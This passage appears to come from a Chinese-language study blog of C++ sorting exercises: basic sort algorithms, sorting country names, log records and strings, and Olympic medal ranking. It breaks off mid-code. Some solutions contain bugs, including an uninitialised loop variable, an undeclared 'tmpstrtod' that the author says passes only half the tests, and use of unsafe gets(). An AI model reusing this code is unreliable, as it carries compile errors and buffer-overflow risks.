<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; len; i++)&#123;</span><br><span class="line">		<span class="type">int</span> tmp = arr[i];</span><br><span class="line">		<span class="type">int</span> j = i - <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">while</span>((j &gt;= <span class="number">0</span>) &amp;&amp; (arr[j] &gt; tmp))&#123;</span><br><span class="line">			arr[j+<span class="number">1</span>] = arr[j];</span><br><span class="line">			j--;</span><br><span class="line">		&#125;</span><br><span class="line">		arr[j+<span class="number">1</span>] = tmp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">		cout &lt;&lt; arr[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shell_sort_onetime</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> gap = <span class="number">5</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = gap; i &lt; len; i++)&#123;</span><br><span class="line">		<span class="type">int</span> tmp = arr[i], j;</span><br><span class="line">		<span class="keyword">for</span>(j = i - gap; j &gt;=<span class="number">0</span> &amp;&amp; arr[j] &gt; tmp; j -= gap)&#123;</span><br><span class="line">			arr[j + gap] = arr[j];</span><br><span class="line">		&#125;</span><br><span class="line">		arr[j + gap] = tmp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">		cout &lt;&lt; arr[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">select_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> idx;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">		idx = i;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; len; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(arr[j] &lt; arr[idx]) idx = j;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="type">int</span> tmp = arr[i];</span><br><span class="line">		arr[i] = arr[idx];</span><br><span class="line">		arr[idx] = tmp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">		cout &lt;&lt; arr[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">quick_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> l, <span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line">	<span class="type">int</span> i = l, j = r, x = arr[l];</span><br><span class="line">	<span class="keyword">while</span>(i &lt; j)&#123;</span><br><span class="line">		<span class="keyword">while</span>(arr[j] &gt;= x &amp;&amp;  i &lt; j) j--;</span><br><span class="line">		<span class="keyword">if</span>(i &lt; j) arr[i++] = arr[j];</span><br><span class="line">		<span class="keyword">while</span>(arr[i] &lt;= x &amp;&amp; i &lt; j) i++;</span><br><span class="line">		<span class="keyword">if</span>(i &lt; j) arr[j--] = arr[i];</span><br><span class="line">	&#125;</span><br><span class="line">	arr[i] = x;</span><br><span class="line">	<span class="built_in">quick_sort</span>(arr, l, i - <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">quick_sort</span>(arr, j + <span class="number">1</span>, r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">start_quick_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span></span>&#123;</span><br><span class="line">	<span class="built_in">quick_sort</span>(arr, <span class="number">0</span>, len<span class="number">-1</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">		cout &lt;&lt; arr[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">twomerge_onetime</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len<span class="number">-1</span>; i += <span class="number">2</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(arr[i] &gt; arr[i+<span class="number">1</span>]) <span class="built_in">swap</span>(arr[i], arr[i+<span class="number">1</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">		cout &lt;&lt; arr[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	cin &gt;&gt; n;</span><br><span class="line">	<span class="type">int</span> m[n], tmp[n];</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i; i &lt; n; i++)&#123;</span><br><span class="line">		cin &gt;&gt; m[i];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//直接插入排序</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">		tmp[i] = m[i];</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="built_in">insert_sort</span>(tmp, n);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//希尔排序</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">		tmp[i] = m[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">shell_sort_onetime</span>(tmp, n);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//直接选择排序</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">		tmp[i] = m[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">select_sort</span>(tmp, n);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//快速排序</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">		tmp[i] = m[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">start_quick_sort</span>(tmp, n);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">		tmp[i] = m[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">twomerge_onetime</span>(tmp, n);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="国名排序">国名排序</h3>
<p>第一行为一个n（n&lt;=100）表示n个国家，第２行到第n＋１行分别为n个国家的名字．</p>
<p>输出n个国家按字典顺序的排列．</p>
<p>字符串比较用strcmp，但是需要用结构体，不能用二维数组。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">country</span>&#123;</span><br><span class="line">	<span class="type">char</span> name[<span class="number">100</span>]; </span><br><span class="line">&#125;s[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">compare</span><span class="params">(<span class="keyword">struct</span> country a, <span class="keyword">struct</span> country b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strcmp</span>(a.name, b.name) &lt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	cin &gt;&gt; n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt; n; i++)&#123;</span><br><span class="line">		cin &gt;&gt; s[i].name;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">sort</span>(s, s+n, compare);;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt; n; i++)&#123;</span><br><span class="line">		cout &lt;&lt; s[i].name &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h3 id="日志排序">日志排序</h3>
<p>有一个网络日志，记录了网络中计算任务的执行情况，每个计算任务对应一条如下形式的日志记录：
“hs_10000_p”是计算任务的名称， “2007-01-17
19:22:53,315”是计算任务开始执行的时间“年-月-日 时：分：秒，毫秒”，
“253.035(s)”是计算任务消耗的时间(以秒计) hs_10000_p 2007-01-17
19:22:53,315 253.035(s) 请你写一个程序，对日志中记录计算任务进行排序。
时间消耗少的计算任务排在前面，时间消耗多的计算任务排在后面。
如果两个计算任务消耗的时间相同，则将开始执行时间早的计算任务排在前面。</p>
<h6 id="输入描述">输入描述:</h6>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">日志中每个记录是一个字符串，每个字符串占一行。最后一行为空行，表示日志结束。日志中最多可能有<span class="number">10000</span>条记录。</span><br><span class="line">计算任务名称的长度不超过<span class="number">10</span>，开始执行时间的格式是<span class="variable constant_">YYYY</span>-<span class="variable constant_">MM</span>-<span class="variable constant_">DD</span> <span class="variable constant_">HH</span><span class="symbol">:MM</span><span class="symbol">:SS</span>,<span class="variable constant_">MMM</span>，消耗时间小数点后有三位数字。</span><br><span class="line">计算任务名称与任务开始时间、消耗时间之间以一个或多个空格隔开，行首和行尾可能有多余的空格。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">排序好的日志记录。每个记录的字符串各占一行。</span><br><span class="line">输入的格式与输入保持一致，输入包括几个空格，你的输出中也应该包含同样多的空格。</span><br></pre></td></tr></table></figure>
<p>读入数据的格式化处理，学到了以下几个东西：</p>
<ol type="1">
<li>string也能进行直接比较，char * 可以用strcmp比较</li>
<li>substr 分割string</li>
<li>strtod把char * 变成浮点数</li>
<li>string中数字比较会麻烦一些，比如"40" &gt; "350"，但是40 &lt;
350.</li>
</ol>
<p>但是不知道为啥只过了一半：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">task</span>&#123;</span><br><span class="line">	string name; </span><br><span class="line">	string t;</span><br><span class="line">	string rt;</span><br><span class="line">	<span class="type">float</span> rt_;</span><br><span class="line">&#125;tk[<span class="number">10000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">compare</span><span class="params">(<span class="keyword">struct</span> task a, <span class="keyword">struct</span> task b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(a.rt_ == b.rt_) <span class="keyword">return</span> a.t &lt; b.t;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> a.rt_ &lt; b.rt_;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	string s;</span><br><span class="line">	<span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">getline</span>(cin, s))&#123;</span><br><span class="line">		<span class="keyword">if</span>(s == <span class="string">&quot;&quot;</span>) <span class="keyword">break</span>;</span><br><span class="line">		<span class="type">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line">		<span class="type">int</span> i=<span class="number">0</span>, j=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(j = len<span class="number">-1</span>; j &gt; <span class="number">0</span>; j--)&#123;</span><br><span class="line">			<span class="keyword">if</span>(s[j] != <span class="string">&#x27; &#x27;</span>&amp;&amp; s[j<span class="number">-1</span>] == <span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">				tk[cnt].rt = s.<span class="built_in">substr</span>(j, len-j);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="type">int</span> l2 = tk[cnt].rt.<span class="built_in">size</span>();</span><br><span class="line">		<span class="type">char</span> tmp[<span class="number">100</span>];</span><br><span class="line">		<span class="built_in">strcpy</span>(tmp, tk[cnt].rt.<span class="built_in">substr</span>(<span class="number">0</span>, l2<span class="number">-3</span>).<span class="built_in">c_str</span>());</span><br><span class="line">		tk[cnt].rt_ = <span class="built_in">strtod</span>(tmpstrtod, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; j; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(s[i] == <span class="string">&#x27; &#x27;</span> &amp;&amp; s[i+<span class="number">1</span>] != <span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">				tk[cnt].name = s.<span class="built_in">substr</span>(<span class="number">0</span>, i+<span class="number">1</span>);;</span><br><span class="line">				tk[cnt].t = s.<span class="built_in">substr</span>(i+<span class="number">1</span>, j-i<span class="number">-1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		cnt ++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">sort</span>(tk, tk+cnt, compare);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; cnt; i++)&#123;</span><br><span class="line">		cout &lt;&lt; tk[i].name &lt;&lt; tk[i].t &lt;&lt; tk[i].rt &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h3 id="字符串排序2">字符串排序2</h3>
<p>编写一个程序，将输入字符串中的字符按如下规则排序(一个测试用例可能包含多组数据，请注意处理)。</p>
<p>规则 1 ：英文字母从 A 到 Z 排列，不区分大小写。</p>
<p>如，输入： <strong>Type</strong> 输出： <strong>epTy</strong></p>
<p>规则 2 ：同一个英文字母的大小写同时存在时，按照输入顺序排列。</p>
<p>如，输入： <strong>BabA</strong> 输出： <strong>aABb</strong></p>
<p>规则 3 ：非英文字母的其它字符保持原来的位置。</p>
<p>如，输入： <strong>By?e</strong> 输出： <strong>Be?y</strong></p>
<p>样例：</p>
<p>输入：</p>
<p>A Famous Saying: Much Ado About Nothing(2012/8).</p>
<p>输出：</p>
<p>A aaAAbc dFgghh : iimM nNn oooos Sttuuuy (2012/8).</p>
<p>思路：字母单独存起来（规则三），然后按字母表排序（cmp），大小写按照输入顺序排即需要稳点排序（stable_sort）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(<span class="type">char</span> a, <span class="type">char</span> b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>((<span class="built_in">islower</span>(a) &amp;&amp; <span class="built_in">islower</span>(b)) || (<span class="built_in">isupper</span>(a) &amp;&amp; <span class="built_in">isupper</span>(b))) <span class="keyword">return</span> a &lt; b;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">tolower</span>(a) != <span class="built_in">tolower</span>(b)) <span class="keyword">return</span> <span class="built_in">tolower</span>(a) &lt; <span class="built_in">tolower</span>(b);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">char</span> s[<span class="number">1000</span>];</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">gets</span>(s))&#123;</span><br><span class="line">		<span class="type">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">		<span class="type">char</span> s_[<span class="number">1000</span>];</span><br><span class="line">		<span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">isalpha</span>(s[i])) s_[idx++] = s[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">stable_sort</span>(s_, s_+idx, cmp);</span><br><span class="line">		idx = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">isalpha</span>(s[i])) s[i] = s_[idx++];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">puts</span>(s);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h3 id="字符串排序3">字符串排序3</h3>
<h5 id="题目描述">题目描述</h5>
<p>先输入你要输入的字符串的个数。然后换行输入该组字符串。每个字符串以回车结束，每个字符串少于一百个字符。
如果在输入过程中输入的一个字符串为“stop”，也结束输入。
然后将这输入的该组字符串按每个字符串的长度，由小到大排序，按排序结果输出字符串。</p>
<h6 id="输入描述-1">输入描述:</h6>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">字符串的个数，以及该组字符串。每个字符串以‘\n’结束。如果输入字符串为“stop”，也结束输入.</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-1">输出描述:</h6>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">可能有多组测试数据，对于每组数据，</span><br><span class="line">将输入的所有字符串按长度由小到大排序输出(如果有“stop”，不输出“stop”)。</span><br><span class="line"></span><br><span class="line">根据输入的字符串个数来动态分配存储空间（采用<span class="built_in">new</span>()函数）。每个字符串会少于<span class="number">100</span>个字符。</span><br><span class="line">测试数据有多组，注意使用<span class="built_in">while</span>()循环输入。</span><br></pre></td></tr></table></figure>
<p>my：cin之后会在缓冲区剩一个，如果再使用读取一行的函数读取会把，得用cin.ignore()</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">st</span>&#123;</span><br><span class="line">	string s;</span><br><span class="line">	<span class="type">int</span> len;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">struct</span> st a, <span class="keyword">struct</span> st b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a.len &lt; b.len;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">		cin.<span class="built_in">ignore</span>();</span><br><span class="line">		<span class="keyword">struct</span> <span class="title class_">st</span> s[n];</span><br><span class="line">		<span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">		<span class="type">char</span> tmp[<span class="number">100</span>];</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			<span class="built_in">gets</span>(tmp);</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">strcmp</span>(tmp, <span class="string">&quot;stop&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				s[i].s = tmp;</span><br><span class="line">				s[i].len = s[i].s.<span class="built_in">size</span>();</span><br><span class="line">				cnt++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">sort</span>(s, s+cnt, cmp);</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; cnt; i++)&#123;</span><br><span class="line">			cout &lt;&lt; s[i].s &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h3 id="奥运排序问题">奥运排序问题</h3>
<h5 id="题目描述-1">题目描述</h5>
<p>按要求，给国家进行排名。</p>
<h5 id="输入输出格式">输入输出格式</h5>
<h6 id="输入描述-2">输入描述:</h6>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">有多组数据。</span><br><span class="line">第一行给出国家数<span class="built_in">N</span>，要求排名的国家数M，国家号从<span class="number">0</span>到<span class="built_in">N</span>-<span class="number">1</span>。</span><br><span class="line">第二行开始的<span class="built_in">N</span>行给定国家或地区的奥运金牌数，奖牌数，人口数（百万）。</span><br><span class="line">接下来一行给出M个国家号。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-2">输出描述:</h6>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">排序有<span class="number">4</span>种方式: 金牌总数 奖牌总数 金牌人口比例 奖牌人口比例 </span><br><span class="line">对每个国家给出最佳排名排名方式 和 最终排名</span><br><span class="line">格式为: 排名:排名方式</span><br><span class="line">如果有相同的最终排名，则输出排名方式最小的那种排名，对于排名方式，金牌总数 &lt; 奖牌总数 &lt; 金牌人口比例 &lt; 奖牌人口比例 </span><br><span class="line">如果有并列排名的情况，即如果出现金牌总数为 <span class="number">100,90,90,80</span>.则排名为<span class="number">1,2,2,4</span>.</span><br><span class="line">每组数据后加一个空行。</span><br></pre></td></tr></table></figure>
<p>我的方法是用结构体定义这四种排名的参数，id和rk也需要在里面，最后根据id在sort一遍。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">country</span>&#123;</span><br><span class="line">	<span class="type">int</span> id;</span><br><span class="line">	<span class="type">double</span> gold_num;</span><br><span class="line">	<span class="type">double</span> prize_num;</span><br><span class="line">	<span class="type">double</span> gold_per_person;</span><br><span class="line">	<span class="type">double</span> prize_per_person;</span><br><span class="line">	<span class="type">int</span> rk[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp0</span><span class="params">(<span class="keyword">struct</span> country a, <span class="keyword">struct</span> country b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a.id &lt; b.id;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp1</span><span class="params">(<span class="keyword">struct</span> country a, <span class="keyword">struct</span> country b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a.gold_num &gt; b.gold_num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp2</span><span class="params">(<span class="keyword">struct</span> country a, <span class="keyword">struct</span> country b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a.prize_num &gt; b.prize_num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp3</span><span class="params">(<span class="keyword">struct</span> country a, <span class="keyword">struct</span> country b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a.gold_per_person &gt; b.gold_per_person;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp4</span><span class="params">(<span class="keyword">struct</span> country a, <span class="keyword">struct</span> country b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a.prize_per_person &gt; b.prize_per_person;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> cn, acn;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; cn &gt;&gt; acn)&#123;</span><br><span class="line">		<span class="keyword">if</span>(acn == <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">struct</span> <span class="title class_">country</span>* cty = <span class="keyword">new</span> <span class="keyword">struct</span> country[cn];</span><br><span class="line">		<span class="type">int</span> acn_id[acn];</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; cn; i++)&#123;</span><br><span class="line">			cty[i].id = i;</span><br><span class="line">			<span class="type">double</span> gold, prize, population;</span><br><span class="line">			cin &gt;&gt; gold &gt;&gt; prize &gt;&gt; population;</span><br><span class="line">			cty[i].gold_num = gold;</span><br><span class="line">			cty[i].prize_num = prize;</span><br><span class="line">			cty[i].gold_per_person = gold / population;</span><br><span class="line">			cty[i].prize_per_person = prize / population;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; acn; i++)&#123;</span><br><span class="line">			cin &gt;&gt; acn_id[i];</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//金牌排名</span></span><br><span class="line">		<span class="built_in">sort</span>(cty, cty+cn, cmp1);</span><br><span class="line">		<span class="type">int</span> rk = <span class="number">1</span>;</span><br><span class="line">		cty[<span class="number">0</span>].rk[<span class="number">0</span>] = rk++;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; cn; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(cty[i].gold_num == cty[i<span class="number">-1</span>].gold_num)&#123;</span><br><span class="line">				cty[i].rk[<span class="number">0</span>] = cty[i<span class="number">-1</span>].rk[<span class="number">0</span>];</span><br><span class="line">				rk++;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> cty[i].rk[<span class="number">0</span>] = rk++;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="comment">//奖牌排名</span></span><br><span class="line">		<span class="built_in">sort</span>(cty, cty+cn, cmp2);</span><br><span class="line">		rk = <span class="number">1</span>;</span><br><span class="line">		cty[<span class="number">0</span>].rk[<span class="number">1</span>] = rk++;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; cn; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(cty[i].prize_num == cty[i<span class="number">-1</span>].prize_num)&#123;</span><br><span class="line">				cty[i].rk[<span class="number">1</span>] = cty[i<span class="number">-1</span>].rk[<span class="number">1</span>];</span><br><span class="line">				rk++;</span><br><span class="line">			&#125;</span><br><span class="line">			